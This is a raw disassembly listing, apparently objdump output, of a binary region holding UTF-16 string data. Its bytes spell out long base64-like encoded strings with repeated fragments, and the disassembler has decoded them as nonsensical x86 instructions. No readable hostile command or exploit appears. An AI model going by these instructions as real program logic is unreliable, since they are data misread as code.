100046c7:	00 33                	add    %dh,(%ebx)
100046c9:	00 65 00             	add    %ah,0x0(%ebp)
100046cc:	6b 00 78             	imul   $0x78,(%eax),%eax
100046cf:	00 31                	add    %dh,(%ecx)
100046d1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100046d5:	00 55 00             	add    %dl,0x0(%ebp)
100046d8:	77 00                	ja     0x100046da
100046da:	56                   	push   %esi
100046db:	00 45 00             	add    %al,0x0(%ebp)
100046de:	68 00 73 00 64       	push   $0x64007300
100046e3:	00 33                	add    %dh,(%ebx)
100046e5:	00 70 00             	add    %dh,0x0(%eax)
100046e8:	4d                   	dec    %ebp
100046e9:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100046ed:	00 5a 00             	add    %bl,0x0(%edx)
100046f0:	6c                   	insb   (%dx),%es:(%edi)
100046f1:	00 4d 00             	add    %cl,0x0(%ebp)
100046f4:	46                   	inc    %esi
100046f5:	00 52 00             	add    %dl,0x0(%edx)
100046f8:	49                   	dec    %ecx
100046f9:	00 62 00             	add    %ah,0x0(%edx)
100046fc:	47                   	inc    %edi
100046fd:	00 31                	add    %dh,(%ecx)
100046ff:	00 6b 00             	add    %ch,0x0(%ebx)
10004702:	51                   	push   %ecx
10004703:	00 33                	add    %dh,(%ebx)
10004705:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004709:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000470d:	00 56 00             	add    %dl,0x0(%esi)
10004710:	32 00                	xor    (%eax),%al
10004712:	5a                   	pop    %edx
10004713:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004717:	00 55 00             	add    %dl,0x0(%ebp)
1000471a:	53                   	push   %ebx
1000471b:	00 47 00             	add    %al,0x0(%edi)
1000471e:	78 00                	js     0x10004720
10004720:	33 00                	xor    (%eax),%eax
10004722:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004726:	78 00                	js     0x10004728
10004728:	31 00                	xor    %eax,(%eax)
1000472a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000472e:	55                   	push   %ebp
1000472f:	00 77 00             	add    %dh,0x0(%edi)
10004732:	56                   	push   %esi
10004733:	00 45 00             	add    %al,0x0(%ebp)
10004736:	68 00 73 00 4e       	push   $0x4e007300
1000473b:	00 55 00             	add    %dl,0x0(%ebp)
1000473e:	39 00                	cmp    %eax,(%eax)
10004740:	53                   	push   %ebx
10004741:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
10004745:	00 70 00             	add    %dh,0x0(%eax)
10004748:	4d                   	dec    %ebp
10004749:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
1000474d:	00 5a 00             	add    %bl,0x0(%edx)
10004750:	6c                   	insb   (%dx),%es:(%edi)
10004751:	00 4d 00             	add    %cl,0x0(%ebp)
10004754:	46                   	inc    %esi
10004755:	00 52 00             	add    %dl,0x0(%edx)
10004758:	49                   	dec    %ecx
10004759:	00 62 00             	add    %ah,0x0(%edx)
1000475c:	48                   	dec    %eax
1000475d:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004761:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004765:	00 56 00             	add    %dl,0x0(%esi)
10004768:	32 00                	xor    (%eax),%al
1000476a:	5a                   	pop    %edx
1000476b:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000476f:	00 55 00             	add    %dl,0x0(%ebp)
10004772:	53                   	push   %ebx
10004773:	00 47 00             	add    %al,0x0(%edi)
10004776:	78 00                	js     0x10004778
10004778:	57                   	push   %edi
10004779:	00 55 00             	add    %dl,0x0(%ebp)
1000477c:	6d                   	insl   (%dx),%es:(%edi)
1000477d:	00 4e 00             	add    %cl,0x0(%esi)
10004780:	33 00                	xor    (%eax),%eax
10004782:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004786:	78 00                	js     0x10004788
10004788:	31 00                	xor    %eax,(%eax)
1000478a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000478e:	55                   	push   %ebp
1000478f:	00 77 00             	add    %dh,0x0(%edi)
10004792:	56                   	push   %esi
10004793:	00 45 00             	add    %al,0x0(%ebp)
10004796:	68 00 73 00 64       	push   $0x64007300
1000479b:	00 33                	add    %dh,(%ebx)
1000479d:	00 70 00             	add    %dh,0x0(%eax)
100047a0:	4d                   	dec    %ebp
100047a1:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100047a5:	00 5a 00             	add    %bl,0x0(%edx)
100047a8:	6c                   	insb   (%dx),%es:(%edi)
100047a9:	00 4d 00             	add    %cl,0x0(%ebp)
100047ac:	46                   	inc    %esi
100047ad:	00 52 00             	add    %dl,0x0(%edx)
100047b0:	49                   	dec    %ecx
100047b1:	00 62 00             	add    %ah,0x0(%edx)
100047b4:	46                   	inc    %esi
100047b5:	00 68 00             	add    %ch,0x0(%eax)
100047b8:	46                   	inc    %esi
100047b9:	00 57 00             	add    %dl,0x0(%edi)
100047bc:	6e                   	outsb  %ds:(%esi),(%dx)
100047bd:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100047c1:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100047c5:	00 56 00             	add    %dl,0x0(%esi)
100047c8:	32 00                	xor    (%eax),%al
100047ca:	5a                   	pop    %edx
100047cb:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100047cf:	00 55 00             	add    %dl,0x0(%ebp)
100047d2:	53                   	push   %ebx
100047d3:	00 47 00             	add    %al,0x0(%edi)
100047d6:	78 00                	js     0x100047d8
100047d8:	33 00                	xor    (%eax),%eax
100047da:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100047de:	78 00                	js     0x100047e0
100047e0:	31 00                	xor    %eax,(%eax)
100047e2:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100047e6:	55                   	push   %ebp
100047e7:	00 77 00             	add    %dh,0x0(%edi)
100047ea:	56                   	push   %esi
100047eb:	00 45 00             	add    %al,0x0(%ebp)
100047ee:	68 00 73 00 65       	push   $0x65007300
100047f3:	00 56 00             	add    %dl,0x0(%esi)
100047f6:	6c                   	insb   (%dx),%es:(%edi)
100047f7:	00 58 00             	add    %bl,0x0(%eax)
100047fa:	64 00 33             	add    %dh,%fs:(%ebx)
100047fd:	00 70 00             	add    %dh,0x0(%eax)
10004800:	4d                   	dec    %ebp
10004801:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004805:	00 5a 00             	add    %bl,0x0(%edx)
10004808:	6c                   	insb   (%dx),%es:(%edi)
10004809:	00 4d 00             	add    %cl,0x0(%ebp)
1000480c:	46                   	inc    %esi
1000480d:	00 52 00             	add    %dl,0x0(%edx)
10004810:	49                   	dec    %ecx
10004811:	00 62 00             	add    %ah,0x0(%edx)
10004814:	48                   	dec    %eax
10004815:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004819:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000481d:	00 56 00             	add    %dl,0x0(%esi)
10004820:	32 00                	xor    (%eax),%al
10004822:	5a                   	pop    %edx
10004823:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004827:	00 55 00             	add    %dl,0x0(%ebp)
1000482a:	53                   	push   %ebx
1000482b:	00 47 00             	add    %al,0x0(%edi)
1000482e:	77 00                	ja     0x10004830
10004830:	78 00                	js     0x10004832
10004832:	62 00                	bound  %eax,(%eax)
10004834:	47                   	inc    %edi
10004835:	00 52 00             	add    %dl,0x0(%edx)
10004838:	33 00                	xor    (%eax),%eax
1000483a:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
1000483e:	78 00                	js     0x10004840
10004840:	31 00                	xor    %eax,(%eax)
10004842:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004846:	55                   	push   %ebp
10004847:	00 77 00             	add    %dh,0x0(%edi)
1000484a:	56                   	push   %esi
1000484b:	00 45 00             	add    %al,0x0(%ebp)
1000484e:	68 00 73 00 64       	push   $0x64007300
10004853:	00 33                	add    %dh,(%ebx)
10004855:	00 70 00             	add    %dh,0x0(%eax)
10004858:	4d                   	dec    %ebp
10004859:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
1000485d:	00 5a 00             	add    %bl,0x0(%edx)
10004860:	6c                   	insb   (%dx),%es:(%edi)
10004861:	00 4d 00             	add    %cl,0x0(%ebp)
10004864:	46                   	inc    %esi
10004865:	00 52 00             	add    %dl,0x0(%edx)
10004868:	49                   	dec    %ecx
10004869:	00 62 00             	add    %ah,0x0(%edx)
1000486c:	44                   	inc    %esp
1000486d:	00 49 00             	add    %cl,0x0(%ecx)
10004870:	35 00 65 00 58       	xor    $0x58006500,%eax
10004875:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004879:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000487d:	00 56 00             	add    %dl,0x0(%esi)
10004880:	32 00                	xor    (%eax),%al
10004882:	5a                   	pop    %edx
10004883:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004887:	00 55 00             	add    %dl,0x0(%ebp)
1000488a:	53                   	push   %ebx
1000488b:	00 47 00             	add    %al,0x0(%edi)
1000488e:	78 00                	js     0x10004890
10004890:	33 00                	xor    (%eax),%eax
10004892:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004896:	78 00                	js     0x10004898
10004898:	31 00                	xor    %eax,(%eax)
1000489a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000489e:	55                   	push   %ebp
1000489f:	00 77 00             	add    %dh,0x0(%edi)
100048a2:	56                   	push   %esi
100048a3:	00 45 00             	add    %al,0x0(%ebp)
100048a6:	68 00 73 00 59       	push   $0x59007300
100048ab:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
100048af:	00 34 00             	add    %dh,(%eax,%eax,1)
100048b2:	64 00 33             	add    %dh,%fs:(%ebx)
100048b5:	00 70 00             	add    %dh,0x0(%eax)
100048b8:	4d                   	dec    %ebp
100048b9:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100048bd:	00 5a 00             	add    %bl,0x0(%edx)
100048c0:	6c                   	insb   (%dx),%es:(%edi)
100048c1:	00 4d 00             	add    %cl,0x0(%ebp)
100048c4:	46                   	inc    %esi
100048c5:	00 52 00             	add    %dl,0x0(%edx)
100048c8:	49                   	dec    %ecx
100048c9:	00 62 00             	add    %ah,0x0(%edx)
100048cc:	48                   	dec    %eax
100048cd:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100048d1:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100048d5:	00 56 00             	add    %dl,0x0(%esi)
100048d8:	32 00                	xor    (%eax),%al
100048da:	5a                   	pop    %edx
100048db:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100048df:	00 55 00             	add    %dl,0x0(%ebp)
100048e2:	53                   	push   %ebx
100048e3:	00 47 00             	add    %al,0x0(%edi)
100048e6:	78 00                	js     0x100048e8
100048e8:	6a 00                	push   $0x0
100048ea:	5a                   	pop    %edx
100048eb:	00 47 00             	add    %al,0x0(%edi)
100048ee:	70 00                	jo     0x100048f0
100048f0:	33 00                	xor    (%eax),%eax
100048f2:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100048f6:	78 00                	js     0x100048f8
100048f8:	31 00                	xor    %eax,(%eax)
100048fa:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100048fe:	55                   	push   %ebp
100048ff:	00 77 00             	add    %dh,0x0(%edi)
10004902:	56                   	push   %esi
10004903:	00 45 00             	add    %al,0x0(%ebp)
10004906:	68 00 73 00 64       	push   $0x64007300
1000490b:	00 33                	add    %dh,(%ebx)
1000490d:	00 70 00             	add    %dh,0x0(%eax)
10004910:	4d                   	dec    %ebp
10004911:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004915:	00 5a 00             	add    %bl,0x0(%edx)
10004918:	6c                   	insb   (%dx),%es:(%edi)
10004919:	00 4d 00             	add    %cl,0x0(%ebp)
1000491c:	46                   	inc    %esi
1000491d:	00 52 00             	add    %dl,0x0(%edx)
10004920:	49                   	dec    %ecx
10004921:	00 62 00             	add    %ah,0x0(%edx)
10004924:	46                   	inc    %esi
10004925:	00 46 00             	add    %al,0x0(%esi)
10004928:	31 00                	xor    %eax,(%eax)
1000492a:	54                   	push   %esp
1000492b:	00 58 00             	add    %bl,0x0(%eax)
1000492e:	64 00 36             	add    %dh,%fs:(%esi)
10004931:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004935:	00 56 00             	add    %dl,0x0(%esi)
10004938:	32 00                	xor    (%eax),%al
1000493a:	5a                   	pop    %edx
1000493b:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000493f:	00 55 00             	add    %dl,0x0(%ebp)
10004942:	53                   	push   %ebx
10004943:	00 47 00             	add    %al,0x0(%edi)
10004946:	78 00                	js     0x10004948
10004948:	33 00                	xor    (%eax),%eax
1000494a:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
1000494e:	78 00                	js     0x10004950
10004950:	31 00                	xor    %eax,(%eax)
10004952:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004956:	55                   	push   %ebp
10004957:	00 77 00             	add    %dh,0x0(%edi)
1000495a:	56                   	push   %esi
1000495b:	00 45 00             	add    %al,0x0(%ebp)
1000495e:	68 00 73 00 51       	push   $0x51007300
10004963:	00 7a 00             	add    %bh,0x0(%edx)
10004966:	52                   	push   %edx
10004967:	00 36                	add    %dh,(%esi)
10004969:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
1000496d:	00 70 00             	add    %dh,0x0(%eax)
10004970:	4d                   	dec    %ebp
10004971:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004975:	00 5a 00             	add    %bl,0x0(%edx)
10004978:	6c                   	insb   (%dx),%es:(%edi)
10004979:	00 4d 00             	add    %cl,0x0(%ebp)
1000497c:	46                   	inc    %esi
1000497d:	00 52 00             	add    %dl,0x0(%edx)
10004980:	49                   	dec    %ecx
10004981:	00 62 00             	add    %ah,0x0(%edx)
10004984:	48                   	dec    %eax
10004985:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004989:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000498d:	00 56 00             	add    %dl,0x0(%esi)
10004990:	32 00                	xor    (%eax),%al
10004992:	5a                   	pop    %edx
10004993:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004997:	00 55 00             	add    %dl,0x0(%ebp)
1000499a:	53                   	push   %ebx
1000499b:	00 47 00             	add    %al,0x0(%edi)
1000499e:	78 00                	js     0x100049a0
100049a0:	4e                   	dec    %esi
100049a1:	00 52 00             	add    %dl,0x0(%edx)
100049a4:	45                   	inc    %ebp
100049a5:	00 31                	add    %dh,(%ecx)
100049a7:	00 33                	add    %dh,(%ebx)
100049a9:	00 65 00             	add    %ah,0x0(%ebp)
100049ac:	6b 00 78             	imul   $0x78,(%eax),%eax
100049af:	00 31                	add    %dh,(%ecx)
100049b1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100049b5:	00 55 00             	add    %dl,0x0(%ebp)
100049b8:	77 00                	ja     0x100049ba
100049ba:	56                   	push   %esi
100049bb:	00 45 00             	add    %al,0x0(%ebp)
100049be:	68 00 73 00 64       	push   $0x64007300
100049c3:	00 33                	add    %dh,(%ebx)
100049c5:	00 70 00             	add    %dh,0x0(%eax)
100049c8:	4d                   	dec    %ebp
100049c9:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100049cd:	00 5a 00             	add    %bl,0x0(%edx)
100049d0:	6c                   	insb   (%dx),%es:(%edi)
100049d1:	00 4d 00             	add    %cl,0x0(%ebp)
100049d4:	46                   	inc    %esi
100049d5:	00 52 00             	add    %dl,0x0(%edx)
100049d8:	49                   	dec    %ecx
100049d9:	00 62 00             	add    %ah,0x0(%edx)
100049dc:	48                   	dec    %eax
100049dd:	00 68 00             	add    %ch,0x0(%eax)
100049e0:	50                   	push   %eax
100049e1:	00 56 00             	add    %dl,0x0(%esi)
100049e4:	6e                   	outsb  %ds:(%esi),(%dx)
100049e5:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100049e9:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100049ed:	00 56 00             	add    %dl,0x0(%esi)
100049f0:	32 00                	xor    (%eax),%al
100049f2:	5a                   	pop    %edx
100049f3:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100049f7:	00 55 00             	add    %dl,0x0(%ebp)
100049fa:	53                   	push   %ebx
100049fb:	00 47 00             	add    %al,0x0(%edi)
100049fe:	78 00                	js     0x10004a00
10004a00:	33 00                	xor    (%eax),%eax
10004a02:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004a06:	78 00                	js     0x10004a08
10004a08:	31 00                	xor    %eax,(%eax)
10004a0a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004a0e:	55                   	push   %ebp
10004a0f:	00 77 00             	add    %dh,0x0(%edi)
10004a12:	56                   	push   %esi
10004a13:	00 45 00             	add    %al,0x0(%ebp)
10004a16:	68 00 73 00 65       	push   $0x65007300
10004a1b:	00 47 00             	add    %al,0x0(%edi)
10004a1e:	4e                   	dec    %esi
10004a1f:	00 33                	add    %dh,(%ebx)
10004a21:	00 65 00             	add    %ah,0x0(%ebp)
10004a24:	6b 00 78             	imul   $0x78,(%eax),%eax
10004a27:	00 31                	add    %dh,(%ecx)
10004a29:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004a2d:	00 55 00             	add    %dl,0x0(%ebp)
10004a30:	77 00                	ja     0x10004a32
10004a32:	56                   	push   %esi
10004a33:	00 45 00             	add    %al,0x0(%ebp)
10004a36:	68 00 73 00 00       	push   $0x7300
10004a3b:	15 77 00 7a 00       	adc    $0x7a0077,%eax
10004a40:	4c                   	dec    %esp
10004a41:	00 75 00             	add    %dh,0x0(%ebp)
10004a44:	76 00                	jbe    0x10004a46
10004a46:	65 00 30             	add    %dh,%gs:(%eax)
10004a49:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004a4d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
10004a51:	80 b9 51 00 7a 00 5a 	cmpb   $0x5a,0x7a0051(%ecx)
10004a58:	00 6f 00             	add    %ch,0x0(%edi)
10004a5b:	55                   	push   %ebp
10004a5c:	00 47 00             	add    %al,0x0(%edi)
10004a5f:	39 00                	cmp    %eax,(%eax)
10004a61:	61                   	popa
10004a62:	00 61 00             	add    %ah,0x0(%ecx)
10004a65:	33 00                	xor    (%eax),%eax
10004a67:	52                   	push   %edx
10004a68:	00 4d 00             	add    %cl,0x0(%ebp)
10004a6b:	64 00 30             	add    %dh,%fs:(%eax)
10004a6e:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
10004a72:	00 4e 00             	add    %cl,0x0(%esi)
10004a75:	55                   	push   %ebp
10004a76:	00 4d 00             	add    %cl,0x0(%ebp)
10004a79:	32 00                	xor    (%eax),%al
10004a7b:	61                   	popa
10004a7c:	00 46 00             	add    %al,0x0(%esi)
10004a7f:	42                   	inc    %edx
10004a80:	00 76 00             	add    %dh,0x0(%esi)
10004a83:	57                   	push   %edi
10004a84:	00 6d 00             	add    %ch,0x0(%ebp)
10004a87:	74 00                	je     0x10004a89
10004a89:	30 00                	xor    %al,(%eax)
10004a8b:	54                   	push   %esp
10004a8c:	00 48 00             	add    %cl,0x0(%eax)
10004a8f:	64 00 44 00 4e       	add    %al,%fs:0x4e(%eax,%eax,1)
10004a94:	00 6d 00             	add    %ch,0x0(%ebp)
10004a97:	68 00 51 00 62       	push   $0x62005100
10004a9c:	00 31                	add    %dh,(%ecx)
10004a9e:	00 70 00             	add    %dh,0x0(%eax)
10004aa1:	72 00                	jb     0x10004aa3
10004aa3:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
10004aa7:	78 00                	js     0x10004aa9
10004aa9:	33 00                	xor    (%eax),%eax
10004aab:	62 00                	bound  %eax,(%eax)
10004aad:	47                   	inc    %edi
10004aae:	00 56 00             	add    %dl,0x0(%esi)
10004ab1:	48                   	dec    %eax
10004ab2:	00 51 00             	add    %dl,0x0(%ecx)
10004ab5:	7a 00                	jp     0x10004ab7
10004ab7:	5a                   	pop    %edx
10004ab8:	00 6f 00             	add    %ch,0x0(%edi)
10004abb:	55                   	push   %ebp
10004abc:	00 47 00             	add    %al,0x0(%edi)
10004abf:	39 00                	cmp    %eax,(%eax)
10004ac1:	61                   	popa
10004ac2:	00 61 00             	add    %ah,0x0(%ecx)
10004ac5:	33 00                	xor    (%eax),%eax
10004ac7:	52                   	push   %edx
10004ac8:	00 4d 00             	add    %cl,0x0(%ebp)
10004acb:	64 00 30             	add    %dh,%fs:(%eax)
10004ace:	00 4d 00             	add    %cl,0x0(%ebp)
10004ad1:	32 00                	xor    (%eax),%al
10004ad3:	61                   	popa
10004ad4:	00 46 00             	add    %al,0x0(%esi)
10004ad7:	42                   	inc    %edx
10004ad8:	00 76 00             	add    %dh,0x0(%esi)
10004adb:	57                   	push   %edi
10004adc:	00 6d 00             	add    %ch,0x0(%ebp)
10004adf:	74 00                	je     0x10004ae1
10004ae1:	30 00                	xor    %al,(%eax)
10004ae3:	54                   	push   %esp
10004ae4:	00 48 00             	add    %cl,0x0(%eax)
10004ae7:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004aeb:	50                   	push   %eax
10004aec:	00 55 00             	add    %dl,0x0(%ebp)
10004aef:	4d                   	dec    %ebp
10004af0:	00 32                	add    %dh,(%edx)
10004af2:	00 61 00             	add    %ah,0x0(%ecx)
10004af5:	46                   	inc    %esi
10004af6:	00 42 00             	add    %al,0x0(%edx)
10004af9:	76 00                	jbe    0x10004afb
10004afb:	57                   	push   %edi
10004afc:	00 6d 00             	add    %ch,0x0(%ebp)
10004aff:	74 00                	je     0x10004b01
10004b01:	30 00                	xor    %al,(%eax)
10004b03:	54                   	push   %esp
10004b04:	00 48 00             	add    %cl,0x0(%eax)
10004b07:	63 00                	arpl   %eax,(%eax)
10004b09:	3d 00 00 15 43       	cmp    $0x43150000,%eax
10004b0e:	00 36                	add    %dh,(%esi)
10004b10:	00 68 00             	add    %ch,0x0(%eax)
10004b13:	50                   	push   %eax
10004b14:	00 6f 00             	add    %ch,0x0(%edi)
10004b17:	5a                   	pop    %edx
10004b18:	00 6b 00             	add    %ch,0x0(%ebx)
10004b1b:	74 00                	je     0x10004b1d
10004b1d:	4c                   	dec    %esp
10004b1e:	00 77 00             	add    %dh,0x0(%edi)
10004b21:	00 81 f1 57 00 58    	add    %al,0x580057f1(%ecx)
10004b27:	00 46 00             	add    %al,0x0(%esi)
10004b2a:	4a                   	dec    %edx
10004b2b:	00 59 00             	add    %bl,0x0(%ecx)
10004b2e:	6a 00                	push   $0x0
10004b30:	6c                   	insb   (%dx),%es:(%edi)
10004b31:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004b35:	00 47 00             	add    %al,0x0(%edi)
10004b38:	4e                   	dec    %esi
10004b39:	00 52 00             	add    %dl,0x0(%edx)
10004b3c:	56                   	push   %esi
10004b3d:	00 31                	add    %dh,(%ecx)
10004b3f:	00 46 00             	add    %al,0x0(%esi)
10004b42:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
10004b46:	46                   	inc    %esi
10004b47:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
10004b4b:	00 53 00             	add    %dl,0x0(%ebx)
10004b4e:	57                   	push   %edi
10004b4f:	00 49 00             	add    %cl,0x0(%ecx)
10004b52:	35 00 51 00 32       	xor    $0x32005100,%eax
10004b57:	00 68 00             	add    %ch,0x0(%eax)
10004b5a:	6a 00                	push   $0x0
10004b5c:	55                   	push   %ebp
10004b5d:	00 56 00             	add    %dl,0x0(%esi)
10004b60:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
10004b64:	63 00                	arpl   %eax,(%eax)
10004b66:	55                   	push   %ebp
10004b67:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10004b6b:	00 4f 00             	add    %cl,0x0(%edi)
10004b6e:	55                   	push   %ebp
10004b6f:	00 4e 00             	add    %cl,0x0(%esi)
10004b72:	6f                   	outsl  %ds:(%esi),(%dx)
10004b73:	00 59 00             	add    %bl,0x0(%ecx)
10004b76:	31 00                	xor    %eax,(%eax)
10004b78:	46                   	inc    %esi
10004b79:	00 58 00             	add    %bl,0x0(%eax)
10004b7c:	59                   	pop    %ecx
10004b7d:	00 31                	add    %dh,(%ecx)
10004b7f:	00 68 00             	add    %ch,0x0(%eax)
10004b82:	47                   	inc    %edi
10004b83:	00 57 00             	add    %dl,0x0(%edi)
10004b86:	58                   	pop    %eax
10004b87:	00 46 00             	add    %al,0x0(%esi)
10004b8a:	4a                   	dec    %edx
10004b8b:	00 59 00             	add    %bl,0x0(%ecx)
10004b8e:	6a 00                	push   $0x0
10004b90:	6c                   	insb   (%dx),%es:(%edi)
10004b91:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004b95:	00 47 00             	add    %al,0x0(%edi)
10004b98:	4e                   	dec    %esi
10004b99:	00 52 00             	add    %dl,0x0(%edx)
10004b9c:	56                   	push   %esi
10004b9d:	00 31                	add    %dh,(%ecx)
10004b9f:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
10004ba3:	00 53 00             	add    %dl,0x0(%ebx)
10004ba6:	57                   	push   %edi
10004ba7:	00 49 00             	add    %cl,0x0(%ecx)
10004baa:	35 00 51 00 32       	xor    $0x32005100,%eax
10004baf:	00 68 00             	add    %ch,0x0(%eax)
10004bb2:	6a 00                	push   $0x0
10004bb4:	55                   	push   %ebp
10004bb5:	00 56 00             	add    %dl,0x0(%esi)
10004bb8:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
10004bbc:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004bc0:	4a                   	dec    %edx
10004bc1:	00 5a 00             	add    %bl,0x0(%edx)
10004bc4:	63 00                	arpl   %eax,(%eax)
10004bc6:	55                   	push   %ebp
10004bc7:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10004bcb:	00 4f 00             	add    %cl,0x0(%edi)
10004bce:	55                   	push   %ebp
10004bcf:	00 4e 00             	add    %cl,0x0(%esi)
10004bd2:	6f                   	outsl  %ds:(%esi),(%dx)
10004bd3:	00 59 00             	add    %bl,0x0(%ecx)
10004bd6:	31 00                	xor    %eax,(%eax)
10004bd8:	46                   	inc    %esi
10004bd9:	00 58 00             	add    %bl,0x0(%eax)
10004bdc:	57                   	push   %edi
10004bdd:	00 58 00             	add    %bl,0x0(%eax)
10004be0:	46                   	inc    %esi
10004be1:	00 4a 00             	add    %cl,0x0(%edx)
10004be4:	59                   	pop    %ecx
10004be5:	00 6a 00             	add    %ch,0x0(%edx)
10004be8:	6c                   	insb   (%dx),%es:(%edi)
10004be9:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004bed:	00 47 00             	add    %al,0x0(%edi)
10004bf0:	4e                   	dec    %esi
10004bf1:	00 52 00             	add    %dl,0x0(%edx)
10004bf4:	56                   	push   %esi
10004bf5:	00 7a 00             	add    %bh,0x0(%edx)
10004bf8:	4a                   	dec    %edx
10004bf9:	00 6b 00             	add    %ch,0x0(%ebx)
10004bfc:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10004c00:	6c                   	insb   (%dx),%es:(%edi)
10004c01:	00 78 00             	add    %bh,0x0(%eax)
10004c04:	53                   	push   %ebx
10004c05:	00 57 00             	add    %dl,0x0(%edi)
10004c08:	49                   	dec    %ecx
10004c09:	00 35 00 51 00 32    	add    %dh,0x32005100
10004c0f:	00 68 00             	add    %ch,0x0(%eax)
10004c12:	6a 00                	push   $0x0
10004c14:	55                   	push   %ebp
10004c15:	00 56 00             	add    %dl,0x0(%esi)
10004c18:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
10004c1c:	63 00                	arpl   %eax,(%eax)
10004c1e:	55                   	push   %ebp
10004c1f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10004c23:	00 4f 00             	add    %cl,0x0(%edi)
10004c26:	55                   	push   %ebp
10004c27:	00 4e 00             	add    %cl,0x0(%esi)
10004c2a:	6f                   	outsl  %ds:(%esi),(%dx)
10004c2b:	00 59 00             	add    %bl,0x0(%ecx)
10004c2e:	31 00                	xor    %eax,(%eax)
10004c30:	46                   	inc    %esi
10004c31:	00 58 00             	add    %bl,0x0(%eax)
10004c34:	57                   	push   %edi
10004c35:	00 56 00             	add    %dl,0x0(%esi)
10004c38:	63 00                	arpl   %eax,(%eax)
10004c3a:	78 00                	js     0x10004c3c
10004c3c:	57                   	push   %edi
10004c3d:	00 58 00             	add    %bl,0x0(%eax)
10004c40:	46                   	inc    %esi
10004c41:	00 4a 00             	add    %cl,0x0(%edx)
10004c44:	59                   	pop    %ecx
10004c45:	00 6a 00             	add    %ch,0x0(%edx)
10004c48:	6c                   	insb   (%dx),%es:(%edi)
10004c49:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004c4d:	00 47 00             	add    %al,0x0(%edi)
10004c50:	4e                   	dec    %esi
10004c51:	00 52 00             	add    %dl,0x0(%edx)
10004c54:	56                   	push   %esi
10004c55:	00 31                	add    %dh,(%ecx)
10004c57:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
10004c5b:	00 53 00             	add    %dl,0x0(%ebx)
10004c5e:	57                   	push   %edi
10004c5f:	00 49 00             	add    %cl,0x0(%ecx)
10004c62:	35 00 51 00 32       	xor    $0x32005100,%eax
10004c67:	00 68 00             	add    %ch,0x0(%eax)
